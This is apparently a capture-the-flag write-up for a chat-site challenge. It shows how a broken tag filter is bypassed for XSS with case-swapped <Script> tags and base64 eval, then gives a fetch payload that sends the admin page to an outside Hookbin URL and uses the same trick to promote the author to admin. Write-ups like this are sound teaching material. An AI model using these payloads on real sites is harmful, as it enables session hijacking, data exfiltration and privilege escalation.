# 90sChat

## XSS
Any 404 or 403 error will use the same page. Since the website doesn't have a favicon even that gets redirected to the error page.

![](https://i.imgur.com/z57ADHv.png)

When we go to `/error.html?msg=<h1>Hello world!</h1>` then we notice the following piece of code got added to our page:
![](https://i.imgur.com/h5k2spw.png)

So something is wrong with the HTML filter, let's take a look.

```js
function removeTags(txt) {
    let ret = ""
    let filtering = false
    for(const c of txt) {
        if(!filtering) ret += c

        if(c == "<") {
            filtering = true
        }
        if(c == ">") {
            filtering = false
        }
    }
    if(ret.indexOf("script") != -1) ret = "XSS detected!"
    return ret
}

document.write("<h1>Error!</h1>")
document.write(removeTags(decodeURI(window.location.search.split("=")[1])))
```

This filter would be correct if the `if(!filtering) ret += c` got executed after checking whether or not the filter should start. Now, a character gets added even if it's supposed to be filtered.

We can exploit this by disabling the filter after it starts, let's try `/error.html?msg=<>h1>Hello world!<>/h1>`

![](https://i.imgur.com/jymgQZC.png)

It worked!

Now we notice that the script looks for "script" and filters it out in case it appears in our exploit. So let's try injecting `/error.html?msg=<>img src=x onerror=alert(1)>`.

![](https://i.imgur.com/ZiVtEQn.png)

Something weird happened, if we look at the code we notice `window.location.search.split("=")[1]`.

This means that our exploit will get messed up if any equal signs are included in the payload. So we can not use HTML attributes in order to get XSS. Meaning that `<script>` is our only option.

Looking at [w3schools](https://www.w3schools.com/jsref/jsref_indexof.asp)' second example of `.indexOf()` we notice that indexOf is caps sensitive. HTML is not. Meaning we can use `<ScRiPt>` and it will bypass the XSS filter but still get executed as valid HTML.

Time to combine all this knowledge and gain XSS.

`/error.html?msg=<>Script>alert(1)<>/Script>`

![](https://i.imgur.com/XXIG8rc.png)

Success! But now our payload can not have any equal signs which might prove difficult, so let's use encoding in order to bypass this restriction.

## Encoding the payload

There are a lot of ways to encode the payload but I will use base64 because it's built into javascript. The problem with base64 is that equal signs are added to the end depending on the length. In order to solve this we will add spaces as padding until this issue is resolved.

Let's try and encode the following script as an example:
```js
let myVariable = "Hello world!"
alert(myVariable)
```

We simply plop it into https://www.base64encode.org/ and we get the following result: `bGV0IG15VmFyaWFibGUgPSAiSGVsbG8gd29ybGQhIgphbGVydChteVZhcmlhYmxlKQ==`

Now we can do two things. We can simply remove the equal signs and `atob()` should automatically fix this padding mistake, or we fix the padding ourselves. To fix the padding we simply add 2 spaces at the end of the script and then we get the following encoded string: `bGV0IG15VmFyaWFibGUgPSAiSGVsbG8gd29ybGQhIgphbGVydChteVZhcmlhYmxlKSAg`

So now all we have to do is throw this into `eval(atob())` and we are done.

So let's go to `/error.html?msg=<>Script>eval(atob("bGV0IG15VmFyaWFibGUgPSAiSGVsbG8gd29ybGQhIgphbGVydChteVZhcmlhYmxlKSAg"))<>/Script>`

![](https://i.imgur.com/NZUfbI8.png)

Our script works! We can now create more complex payloads.

## Getting admin
![](https://i.imgur.com/6YBprTB.png)

In the source code we notice a link to an admin page, which is hidden via CSS. Let's try and go to /admin.

![](https://i.imgur.com/0rQGklu.png)

This means that this page exists but we don't have access. Luckily we have an XSS and can still see what is going on by making the admin send the admin page to us.

So our goal is to `fetch("/admin")` and then send it's response to us. We can use a variety of tools to perform this out-of-band attack. I chose [Hookbin](https://hookbin.com/) to do this.

```js
fetch("/admin")
.then(response => response.text())
.then(data => {
    fetch("https://hookb.in/kxYQENNwMqUBDokBLK7n?q=" + encodeURI(data))
})
```

Now we just encode this payload and give it a try by going to
`/error.html?msg=<>Script>eval(atob("ZmV0Y2goIi9hZG1pbiIpCi50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKLnRoZW4oZGF0YSA9PiB7CiAgICBmZXRjaCgiaHR0cHM6Ly9ob29rYi5pbi9reFlRRU5Od01xVUJEb2tCTEs3bj9xPSIgKyBlbmNvZGVVUkkoZGF0YSkpCn0p"))<>/Script>`

![](https://i.imgur.com/ZQN7bg0.png)

Now we get an error, which is expected, since we do not have access to this resource, but now, let's put the same URL in the chat and see what happens.

![](https://i.imgur.com/7PajRBN.png)

Success! Let's see what exactly is inside the admin page.

```html
<html>
<head>
    <title>Admin Panel</title>
</head>
<body>
    <h1>Welcome, admin!</h1>
    <nav>
        <ul>
            <li><a href="userManagementPage.html">Manage Users</a></li>
            <li><a href="clearChatHistory.html">Clear Chat History</a></li>
            <li><a href="ipAddresses.html">IP Addresses</a></li>
        </ul>
    </nav>
</body>
</html>
```

Now our objective is to make ourselves an admin, so let's repeat the same exploit but this time we fetch `/admin/userManagementPage.html`

```html
<html>
  <head>
    <title>User Management</title>
  </head>
  <body>
    <h1>User Management</h1>
    <ul>
      <li>admin - <a href="ban.html?username=admin">ban</a> - <a href="promoteToSuper.html?username=admin">make admin</a></li>
      <li>bram - <a href="ban.html?username=bram">ban</a> - <a href="promoteToSuper.html?username=bram">make admin</a></li>
      <li>daanimator - <a href="ban.html?username=daanimator">ban</a> - <a href="promoteToSuper.html?username=daanimator">make admin</a></li>
      <li>teddyanton - <a href="ban.html?username=teddyanton">ban</a> - <a href="promoteToSuper.html?username=teddyanton">make admin</a></li>
      <li>spikey - <a href="ban.html?username=spikey">ban</a> - <a href="promoteToSuper.html?username=spikey">make admin</a></li>
      <li>jenne - <a href="ban.html?username=jenne">ban</a> - <a href="promoteToSuper.html?username=jenne">make admin</a></li>
      <li>emre - <a href="ban.html?username=emre">ban</a> - <a href="promoteToSuper.html?username=emre">make admin</a></li>
      <li>nathan - <a href="ban.html?username=nathan">ban</a> - <a href="promoteToSuper.html?username=nathan">make admin</a></li>
      <li>michel - <a href="ban.html?username=michel">ban</a> - <a href="promoteToSuper.html?username=michel">make admin</a></li>
      <li>ewoudje - <a href="ban.html?username=ewoudje">ban</a> - <a href="promoteToSuper.html?username=ewoudje">make admin</a></li>
      <li>ely - <a href="ban.html?username=ely">ban</a> - <a href="promoteToSuper.html?username=ely">make admin</a></li>
      <li>BramVanGaal - <a href="ban.html?username=BramVanGaal">ban</a> - <a href="promoteToSuper.html?username=BramVanGaal">make admin</a></li>
    </ul>
  </body>
</html>
```

We see that our user is at the bottom, now it is time to promote ourselves to admin. Let's pull the same exploit, only this time we go to `/admin/promoteToSuper.html?username=BramVanGaal`.

```html
<html>
  <head>
    <title>Grant Admin</title>
  </head>
  <body>
    <h1>Success!</h1>
    <p>This user is now an administrator.</p>
  </body>
</html>
```

Sweet! Now we refresh our page and see what happens.

![](https://i.imgur.com/P3XbyZO.png)

We are greeted with the flag. This challenge is now solved :smile: 